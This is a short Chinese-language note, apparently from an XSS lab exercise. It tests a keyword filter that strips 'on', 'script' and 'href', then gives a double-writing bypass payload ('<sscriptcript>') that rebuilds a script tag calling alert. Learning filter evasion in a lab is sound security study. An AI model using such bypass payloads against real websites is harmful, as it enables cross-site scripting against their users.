测试

```
onfocus <script> <a href=javascript:alert('xss');>
```



得到

```
focus <> <a =java:alert('xss');>
```

on  script   href  都被过了成空白了。



双写绕过

```
">  <sscriptcript>alert('xss')</sscriptcript> <"
```

